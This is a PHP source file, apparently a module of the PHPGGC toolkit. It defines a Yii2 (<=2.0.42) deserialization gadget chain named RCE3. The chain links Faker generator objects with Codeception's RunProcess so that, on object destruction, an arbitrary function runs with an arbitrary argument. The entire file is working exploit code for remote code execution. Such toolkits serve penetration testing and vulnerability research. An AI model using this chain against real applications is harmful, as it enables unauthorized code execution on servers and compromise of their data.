<?php

namespace GadgetChain\Yii2;


class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '<=2.0.42';
    public static $vector = '__destruct';
    public static $author = 'xxx';
    public static $information = 'Executes $function with $parameter using call_user_func.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $defaultGen = new \Faker\DefaultGenerator($parameter);
        $validGen = new \Faker\ValidGenerator($function, $defaultGen);
        $pro = new \Codeception\Extension\RunProcess($validGen);

        return $pro;
    }
}
